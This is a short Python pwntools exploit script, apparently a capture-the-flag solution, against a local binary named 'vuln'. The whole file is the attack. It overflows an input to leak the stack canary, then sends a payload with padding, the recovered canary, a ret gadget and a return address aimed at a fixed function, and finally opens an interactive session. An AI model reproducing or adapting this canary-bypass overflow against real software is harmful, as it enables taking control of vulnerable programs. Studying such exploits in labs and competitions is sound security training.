#!usr/bin/env/python3

from pwn import *
# context.log_level = 'debug'

exe = ELF("./vuln")
context.binary = exe

gs = '''
b *0x00000000004014cb
'''

def conn():
    if args.GDB:
        return gdb.debug(exe.path,gdbscript=gs)
        
    else:
        return process([exe.path])

    return r


p = conn()


p.recvline()
p.recvline()

p.sendline('300')
p.sendline('A'*280)
p.recvline()
p.recvline()
p.recvline()
canary = b'\x00' + p.recv(7)

canary = u64(canary)

print(hex(canary))

print(p.recvline())
print(p.recvline())
print(p.recvline())

payload = b"A"*104
payload += p64(canary)
payload += b"A"*56
payload += p64(0x000000000040101a) 
payload += p64(0x00000000401296)


p.sendline(payload)

p.interactive()
